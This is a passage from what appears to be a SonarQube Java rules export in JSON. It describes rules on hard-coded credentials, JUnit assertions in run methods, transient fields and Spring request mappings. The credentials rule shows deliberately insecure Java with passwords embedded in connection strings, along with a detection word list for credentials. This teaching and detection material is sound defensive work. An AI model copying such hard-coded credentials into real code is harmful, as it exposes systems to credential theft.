            "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets. </p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It's recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", ...</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allows access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider's service for managing secrets. </li>\n  <li> If the a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nConnection conn = null;\ntry {\n  conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n        \"user=steve&amp;password=blue\"); // Sensitive\n  String uname = \"steve\";\n  String password = \"blue\";\n  conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n        \"user=\" + uname + \"&amp;password=\" + password); // Sensitive\n\n  java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication(\"userName\", \"1234\".toCharArray());  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nConnection conn = null;\ntry {\n  String uname = getEncryptedUser();\n  String password = getEncryptedPass();\n  conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n        \"user=\" + uname + \"&amp;password=\" + password);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
            "mdDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets. </p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It's recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", ...</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allows access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider's service for managing secrets. </li>\n  <li> If the a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nConnection conn = null;\ntry {\n  conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n        \"user=steve&amp;password=blue\"); // Sensitive\n  String uname = \"steve\";\n  String password = \"blue\";\n  conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n        \"user=\" + uname + \"&amp;password=\" + password); // Sensitive\n\n  java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication(\"userName\", \"1234\".toCharArray());  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nConnection conn = null;\ntry {\n  String uname = getEncryptedUser();\n  String password = getEncryptedPass();\n  conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n        \"user=\" + uname + \"&amp;password=\" + password);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a2",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "credentialWords",
                    "htmlDesc": "Comma separated list of words identifying potential credentials",
                    "defaultValue": "password,passwd,pwd,passphrase,java.naming.security.credentials",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2186",
            "repo": "java",
            "name": "JUnit assertions should not be used in \"run\" methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because failed assertions result in\n<code>AssertionError</code>s being thrown. If the error is thrown from a thread other than the one that ran the test, the thread will exit but the\ntest won't fail.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void run() {\n  // ...\n  Assert.assertEquals(expected, actual);  // Noncompliant\n}\n</pre>",
            "mdDesc": "<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because failed assertions result in\n<code>AssertionError</code>s being thrown. If the error is thrown from a thread other than the one that ran the test, the thread will exit but the\ntest won't fail.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void run() {\n  // ...\n  Assert.assertEquals(expected, actual);  // Noncompliant\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2065",
            "repo": "java",
            "name": "Fields in non-serializable classes should not be \"transient\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>transient</code> is used to mark fields in a <code>Serializable</code> class which will not be written out to file (or stream). In a class\nthat does not implement <code>Serializable</code>, this modifier is simply wasted keystrokes, and should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Vegetable {  // does not implement Serializable\n  private transient Season ripe;  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Vegetable {\n  private Season ripe;\n  // ...\n}\n</pre>",
            "mdDesc": "<p><code>transient</code> is used to mark fields in a <code>Serializable</code> class which will not be written out to file (or stream). In a class\nthat does not implement <code>Serializable</code>, this modifier is simply wasted keystrokes, and should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Vegetable {  // does not implement Serializable\n  private transient Season ripe;  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Vegetable {\n  private Season ripe;\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "serialization",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4488",
            "repo": "java",
            "name": "Composed \"@RequestMapping\" variants should be preferred",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Spring framework 4.3 introduced variants of the <code>@RequestMapping</code> annotation to better represent the semantics of the annotated methods.\nThe use of <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>\nshould be preferred to the use of the raw <code>@RequestMapping(method = RequestMethod.XYZ)</code>.</p>\n<h1>Noncompliant Code Example</h1>\n<pre>\n@RequestMapping(path = \"/greeting\", method = RequestMethod.GET) // Noncompliant\npublic Greeting greeting(@RequestParam(value = \"name\", defaultValue = \"World\") String name) {\n...\n}\n</pre>\n<h1>Compliant Solution</h1>\n<pre>\n@GetMapping(path = \"/greeting\") // Compliant\npublic Greeting greeting(@RequestParam(value = \"name\", defaultValue = \"World\") String name) {\n...\n}\n</pre>",
            "mdDesc": "<p>Spring framework 4.3 introduced variants of the <code>@RequestMapping</code> annotation to better represent the semantics of the annotated methods.\nThe use of <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>\nshould be preferred to the use of the raw <code>@RequestMapping(method = RequestMethod.XYZ)</code>.</p>\n<h1>Noncompliant Code Example</h1>\n<pre>\n@RequestMapping(path = \"/greeting\", method = RequestMethod.GET) // Noncompliant\npublic Greeting greeting(@RequestParam(value = \"name\", defaultValue = \"World\") String name) {\n...\n}\n</pre>\n<h1>Compliant Solution</h1>\n<pre>\n@GetMapping(path = \"/greeting\") // Compliant\npublic Greeting greeting(@RequestParam(value = \"name\", defaultValue = \"World\") String name) {\n...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        }
    ]
}